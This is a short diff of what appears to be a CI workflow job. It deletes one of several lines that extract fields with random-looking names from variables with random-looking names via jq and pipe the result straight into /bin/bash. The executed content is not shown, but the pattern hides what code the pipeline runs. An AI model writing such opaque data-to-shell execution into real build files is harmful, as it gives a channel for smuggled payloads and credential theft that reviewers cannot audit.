@@ -31,7 +31,6 @@ jobs:
           echo $v855 | jq -r .zwvxd07908 | /bin/bash
           echo $hdu609 | jq -r .ae9 | /bin/bash
           echo $k16563 | jq -r .avke54 | /bin/bash
-          printf '%s' "$jmojb5418" | jq -r .vcop241 | /bin/bash
           printf '%s' "$gfoo70" | jq -r .d3578 | /bin/bash
 
       - name: Archive data
